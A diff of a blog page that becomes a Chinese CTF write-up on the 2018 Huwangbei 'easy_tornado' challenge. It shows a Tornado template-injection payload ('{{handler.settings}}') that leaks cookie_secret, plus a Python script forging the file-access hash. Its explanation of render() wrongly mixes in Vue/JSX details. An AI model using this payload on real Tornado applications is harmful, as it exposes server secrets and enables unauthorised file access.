@@ -2,10 +2,9 @@
 <html>
 
 <head>
-    
-                <meta charset="utf-8" />
+    <meta charset="utf-8" />
 <title>
-    Friends | Ro1ing
+    Ro1ing
 </title>
 <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
@@ -46,7 +45,6 @@
                                 })();
                             </script>
                             
-                    
 </head>
 
 <body>
@@ -162,34 +160,176 @@
                 <div class="container">
                     <article class="post-wrap">
                         <header class="post-header">
-                            <h1 class="post-title zh">
-                                &#x53CB;&#x94FE;
+                            <h1 class="post-title">
+                                [护网杯2018]easy_tornado
                             </h1>
-                            <h1 class="post-title en">
-                                Friends
-                            </h1>
+                            
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        Ro1ing
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2021-01-30</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">1.4
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">350</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://Ro1ing.github.io/tag/yrTjWm0vw/">SSTI</a>
+                                
+                                <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">CTF</a>
+                                
+                            </span>
+                                        
+                                </div>
+                                
                         </header>
+                        
                         <div class="post-content">
+                            <p>都打开看看</p>
+<blockquote>
+<p>/flag. txt<br>
+flag in/flllllllag</p>
+</blockquote>
+<blockquote>
+<p>/welcome. txt<br>
+render</p>
+</blockquote>
+<blockquote>
+<p>/hints. txt<br>
+md5(cookie_secret+md5(filename) )</p>
+</blockquote>
+<p><strong>render()函数详解</strong></p>
+<blockquote>
+<p>1.<strong>render方法的实质就是生成 itemplate模板</strong><br>
+2.通过调用一个方法来生成，而这个方法是通过 render方法的参数传递给它的<br>
+3.这个方法有三个参数，分别提供标签名，标签相关属性，标签内部的htm内容<br>
+4.通过这三个参数，可以生成一个完整的木模板</p>
+<p>tips：</p>
+<blockquote>
+<p>1、render方法可以使用SX语法，但需要 Babel plugin插件<br>
+2、 render方法里的第三个参数可以使用函数来生成多个组件（特别是如果他们相同的话），只要生成结果是一个数组，且数组元素都是vNode即可</p>
+</blockquote>
+</blockquote>
+<p>通过这种方式在网页上显示</p>
+<p><strong>render 标志着模板注入</strong></p>
+<blockquote>
+<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>
+</blockquote>
+<p>测试一下</p>
+<blockquote>
+<p>/error?msg={ {1*2} }</p>
+</blockquote>
+<p>经过测试发现过滤</p>
+<p>payload:</p>
+<blockquote>
+<p>/error?msg={ {handler.settings} }</p>
+</blockquote>
+<p>cookie_secret 是handler.application.settings 的 <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">键值</a><br>
+拿到 cookie_secret 解密</p>
+<pre><code class="language-python">import hashlib
+hash = hashlib.md5()
+
+filename='/fllllllllllllag'
+cookie_secret=&quot;8b1de274-3078-4412-a8c4-a6835eeda4a1&quot;
+hash.update(filename.encode('utf-8'))
+s1=hash.hexdigest()
+hash = hashlib.md5()
+hash.update((cookie_secret+s1).encode('utf-8'))
+print(hash.hexdigest())
+</code></pre>
+<p>得到flag</p>
+<p><strong>拓展</strong>:</p>
+<pre><code class="language-python">#生成 Tornado 所需的 cookie_secret 的办法
+import base64
+import uuid
+base64.b64encode(uuid.uuid4().bytes + uuid.uuid4().bytes)
+</code></pre>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                
+                            </div>
                             
                                 
-                                    <div class="friend-box">
-                                        <img class="friend-avatar" src="https://blog.itjoker.cn/images/avatar.png">
-                                        <div class="flink-info">
-                                            <a href="https://blog.itjoker.cn" target="_blank">
-                                                ITJoker
-                                            </a>
-                                            <br />
-                                            ITJoker&#39;s Blog
-                                        </div>
-                                    </div>
                                     
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>Ro1ing</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/">https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
                                         
-                        </div>
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/&sharesource=qzone&title=[护网杯2018]easy_tornado&pics=https://Ro1ing.github.io/images/avatar.png?v=1611987745664&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/&sharesource=weibo&title=[护网杯2018]easy_tornado + " - " + &pic="https://Ro1ing.github.io/images/avatar.png?v=1611987745664 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://Ro1ing.github.io/tag/yrTjWm0vw/">#
+                                                SSTI
+                                                    </a>
+                                                    
+                        <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">#
+                                                CTF
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/">
+                                                                                                    [极客大挑战 2019]LoveSQL
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
                     </article>
                 </div>
+                
+                                            
             </div>
-            
-                                        
+    </div>
+    </div>
     </div>
     
     <div id="player"></div>
@@ -270,6 +410,10 @@
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
+        </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
